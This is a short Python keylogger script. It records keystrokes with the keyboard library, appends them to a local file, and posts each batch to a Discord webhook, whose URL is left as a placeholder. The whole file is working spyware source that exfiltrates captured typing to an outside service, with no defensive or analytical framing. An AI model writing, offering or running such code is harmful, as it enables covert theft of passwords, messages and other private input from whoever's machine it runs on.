#version 1.0.0
#this version saves a copy of the keys in local and send a copy to a discord webhook
import keyboard as kb
import requests as rq

path = "C:\\Users\\Usuario\\saved_keys.txt"

webhook = "your discord webhook here"
BRAKE = 'Enter'

while True:
    recorded_key = kb.record(until=BRAKE)
    with open(path, "a") as file:
        file.write(str(recorded_key))
        print("keys saved locally")

    data = {
        "embeds": [{
            "title": "raw_data_key",
            "description": f"```{recorded_key}```",
            "color": 16711680
        }]
    }
    code = rq.post(webhook, json=data)
    if 200 < code.status_code < 300:
        print(f"data send successfully: {code.status_code}")
    else:
       print("[-] the keys cant be send ...")

